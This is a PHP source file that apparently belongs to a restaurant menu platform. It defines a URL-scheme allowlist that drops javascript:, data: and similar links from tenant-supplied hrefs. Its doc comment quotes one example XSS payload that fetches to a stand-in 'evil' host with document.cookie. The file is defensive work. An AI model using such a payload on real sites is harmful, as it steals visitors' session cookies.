<?php

namespace App\Support;

/**
 * Scheme allowlist for tenant-supplied URLs that end up in an <a href>.
 *
 * A restaurant admin controls values like the public review link; a value of
 * `javascript:fetch('//evil?c='+document.cookie)` would run in the public menu's
 * own origin the moment a diner taps it. Only http(s), mailto and tel survive —
 * anything else (javascript:, data:, vbscript:, …) collapses to null so the
 * link is dropped rather than rendered.
 *
 * This mirrors apps/menu/src/lib/safeUrl.js on purpose. The client guard is
 * what protects the current render; this one makes the API incapable of handing
 * a dangerous scheme to *any* client, including future ones that forget.
 */
class SafeUrl
{
    private const ALLOWED_SCHEMES = ['http', 'https', 'mailto', 'tel'];

    public static function forLink(?string $value): ?string
    {
        $value = trim((string) $value);

        if ($value === '') {
            return null;
        }

        $scheme = parse_url($value, PHP_URL_SCHEME);

        // A scheme-relative ("//host/path") or relative URL carries no scheme
        // and cannot execute script; resolution is the client's business.
        if ($scheme === null || $scheme === false) {
            return str_starts_with($value, '//') || ! str_contains($value, ':') ? $value : null;
        }

        return in_array(strtolower($scheme), self::ALLOWED_SCHEMES, true) ? $value : null;
    }
}
